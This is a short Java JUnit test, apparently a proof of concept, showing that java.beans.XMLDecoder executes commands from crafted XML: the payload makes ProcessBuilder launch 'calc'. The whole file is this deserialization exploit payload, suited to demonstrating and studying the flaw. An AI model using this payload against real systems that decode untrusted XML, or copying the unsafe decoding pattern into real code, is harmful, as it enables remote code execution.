package bug;

import java.beans.XMLDecoder;
import java.io.ByteArrayInputStream;

import org.junit.Test;

public class TestXMLDecoder {
	@Test
	public void testXMLDecoderByXmlSt() {
		String xml = new StringBuilder().append("<?xml version=\"1.0\" encoding=\"UTF-8\"?>")
				.append("<java version=\"1.8.0_151\" class=\"java.beans.XMLDecoder\">")
				.append("    <object class=\"java.lang.ProcessBuilder\">")
				.append("        <array class=\"java.lang.String\" length=\"1\">")
				.append("            <void index=\"0\">")
				.append("                <string>calc</string>")
				.append("            </void>")
				.append("        </array>")
				.append("        <void method=\"start\" />")
				.append("    </object>")
				.append("</java>").toString();
		XMLDecoder xd = null;
		try {
			xd = new XMLDecoder(new ByteArrayInputStream(xml.getBytes()));
		} catch (Exception e) {
			e.printStackTrace();
		}
		xd.readObject();
		xd.close();
	}
}
